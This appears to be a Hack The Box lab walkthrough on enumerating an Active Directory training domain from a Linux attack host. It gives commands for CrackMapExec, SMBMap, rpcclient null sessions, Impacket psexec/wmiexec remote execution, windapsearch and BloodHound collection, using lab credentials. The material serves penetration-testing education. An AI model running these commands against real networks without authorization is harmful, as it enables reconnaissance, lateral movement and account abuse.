
Now that we have acquired a foothold in the domain, it is time to dig deeper using our low privilege domain user credentials. Since we have a general idea about the domain's userbase and machines, it's time to enumerate the domain in depth. We are interested in information about domain user and computer attributes, group membership, Group Policy Objects, permissions, ACLs, trusts, and more.

> **Note:** Most of these tools require valid domain user credentials at any permission level. At a minimum, you need a user's cleartext password, NTLM password hash, or SYSTEM access on a domain-joined host.

---

## Getting Started

To follow along, spawn the target at the bottom of this section and SSH to the Linux attack host as the `htb-student` user. For enumeration of the `INLANEFREIGHT.LOCAL` domain using the tools installed on the `ATTACK01 Parrot Linux` host, we will use the following credentials:

- **User:** `forend`
- **Password:** `Klmcargo2`

Once our access is established, it's time to get to work. We'll start with **CrackMapExec**.

---

## CrackMapExec

**CrackMapExec (CME, now NetExec)** is a powerful toolset to help with assessing AD environments. It utilizes packages from the Impacket and PowerSploit toolkits to perform its functions.

For detailed explanations, see the [https://github.com/byt3bl33d3r/CrackMapExec/wiki](https://github.com/byt3bl33d3r/CrackMapExec/wiki). Use the `-h` flag to review available options and syntax.

### CME Help Menu

```shell
shell

LeDaav@htb[/htb]$ crackmapexec -h
```

<details> <summary>Click to expand CME help output</summary>

```


usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--darrell]
                    [--verbose]
                    {mssql,smb,ssh,winrm} ...
...
```

</details>

#### Supported Protocols

- MSSQL
- SMB
- SSH
- WinRM

---

### CME Options (SMB)

```shell
shell

LeDaav@htb[/htb]$ crackmapexec smb -h
```

<details> <summary>Click to expand SMB help output</summary>

```


usage: crackmapexec smb [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] ...
...
```

</details>

#### Flags of Interest

- `-u` Username
- `-p` Password
- `Target` (IP or FQDN)
- `--users` Enumerate Domain Users
- `--groups` Enumerate Domain Groups
- `--loggedon-users` Enumerate logged on users

---

### Domain User Enumeration

```shell
shell

LeDaav@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

Sample Output:

```


SMB 172.16.5.5 445 ACADEMY-EA-DC01  [+] Enumerated domain user(s)
SMB 172.16.5.5 445 ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator badpwdcount: 0 ...
...
```

---

### Domain Group Enumeration

```shell
shell

LeDaav@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

Sample Output:

```


SMB 172.16.5.5 445 ACADEMY-EA-DC01  [+] Enumerated domain group(s)
SMB 172.16.5.5 445 ACADEMY-EA-DC01  Administrators membercount: 3
...
```

---

### Logged On Users

```shell
shell

LeDaav@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

Sample Output:

```


SMB 172.16.5.130 445 ACADEMY-EA-FILE  [+] Enumerated loggedon users
SMB 172.16.5.130 445 ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent logon_server: ACADEMY-EA-DC01
...
```

---

### Share Enumeration

```shell
shell

LeDaav@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

Sample Output:

```


SMB 172.16.5.5 445 ACADEMY-EA-DC01  [+] Enumerated shares
SMB 172.16.5.5 445 ACADEMY-EA-DC01  Share           Permissions     Remark
...
```

---

### Spider_plus Module

```shell
shell

LeDaav@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

Sample Output:

```


SPIDER_P... 172.16.5.5 445 ACADEMY-EA-DC01  [*] Started spidering plus with option:
...
```

---

## SMBMap

**SMBMap** is great for enumerating SMB shares from a Linux attack host.

### Check Access

```shell
shell

LeDaav@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

### Recursive Directory Listing

```shell
shell

LeDaav@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

---

## rpcclient

**rpcclient** is a handy tool for interacting with the Samba protocol and MS-RPC.

### Null Session Example

```bash
bash

rpcclient -U "" -N 172.16.5.5
```

### User Enumeration by RID

```shell
shell

rpcclient $> queryuser 0x457
```

### Enumerate All Users

```shell
shell

rpcclient $> enumdomusers
```

---

## Impacket Toolkit

**Impacket** provides many tools for enumeration and exploitation of Windows protocols.

### psexec.py

```bash
bash

psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

### wmiexec.py

```bash
bash

wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

---

## Windapsearch

**Windapsearch** is a Python script for LDAP enumeration.

### Help

```shell
shell

LeDaav@htb[/htb]$ windapsearch.py -h
```

### Enumerate Domain Admins

```shell
shell

LeDaav@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

### Enumerate Privileged Users

```shell
shell

LeDaav@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

---

## Bloodhound.py

**BloodHound** is a powerful tool for auditing Active Directory security.

### Options

```shell
shell

LeDaav@htb[/htb]$ bloodhound-python -h
```

### Collect All Data

```shell
shell

LeDaav@htb[/htb]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```

### Viewing Results

After running, you will see output files like:

```


20220307163102_computers.json  20220307163102_domains.json  20220307163102_groups.json  20220307163102_users.json
```

Upload these files (or a zip archive) into the BloodHound GUI for analysis.

---

## Conclusion

We experimented with several new tools for domain enumeration from a Linux host. The following section will cover several more tools we can use from a domain-joined Windows host.

> **Tip:** Check out the [https://wadcoms.github.io/](https://wadcoms.github.io/) — an interactive cheat sheet for many of the tools covered in this module.